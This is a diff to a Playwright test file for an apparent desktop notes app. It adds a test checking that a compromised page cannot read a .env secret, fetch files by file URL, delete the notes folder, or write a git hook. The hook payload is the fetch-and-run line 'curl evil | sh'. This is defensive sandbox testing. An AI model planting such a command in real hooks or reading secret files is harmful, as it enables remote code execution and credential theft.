@@ -1,6 +1,7 @@
 import { expect, test } from '@playwright/test'
 import { access, readFile, writeFile } from 'node:fs/promises'
 import { join } from 'node:path'
+import { pathToFileURL } from 'node:url'
 import { article, axeViolations, close, killTree, launch, makeNotes, removeDir, stubSaveDialog, type Launched } from './harness'
 
 const NOTES = {
@@ -177,4 +178,33 @@ test('welcome and reading views pass automated accessibility checks', async () =
   await run.page.waitForTimeout(800)
   // KaTeX keeps a visually hidden MathML copy beside its HTML; axe misreads that pair.
   expect(await axeViolations(run.page, { exclude: ['.katex'] })).toEqual([])
+})
+
+test('a compromised page still cannot reach files outside what was opened', async () => {
+  run = await launch({ notes: await makeNotes({ ...NOTES, '.env': 'SECRET=1\n', '.git/hooks/pre-commit': '#!/bin/sh\n' }) })
+  await openFile('Tasks.md')
+  const notes = run.notes!
+  const paths = {
+    dir: notes,
+    fileUrl: pathToFileURL(join(notes, 'Tasks.md')).href,
+    env: join(notes, '.env'),
+    hook: join(notes, '.git', 'hooks', 'pre-commit'),
+    markdown: join(notes, 'Tasks.md')
+  }
+  const probe = await run.page.evaluate(async (p) => {
+    const settle = (work: Promise<unknown>) => work.then(() => ({ ok: true }), () => ({ ok: false }))
+    return {
+      fetchFile: await settle(fetch(p.fileUrl).then((r) => (r.ok ? r.text() : Promise.reject(new Error(String(r.status)))))),
+      readEnv: await settle(window.api.readFile(p.env)),
+      writeHook: await settle(window.api.saveFile(p.hook, 'curl evil | sh')),
+      trashRoot: await window.api.trashItem(p.dir),
+      readMarkdown: await settle(window.api.readFile(p.markdown))
+    }
+  }, paths)
+  expect(probe.fetchFile.ok).toBe(false)
+  expect(probe.readEnv.ok).toBe(false)
+  expect(probe.writeHook.ok).toBe(false)
+  expect(probe.trashRoot).toBe(false)
+  expect(probe.readMarkdown.ok).toBe(true)
+  expect(await readFile(join(notes, '.git', 'hooks', 'pre-commit'), 'utf8')).toBe('#!/bin/sh\n')
 })
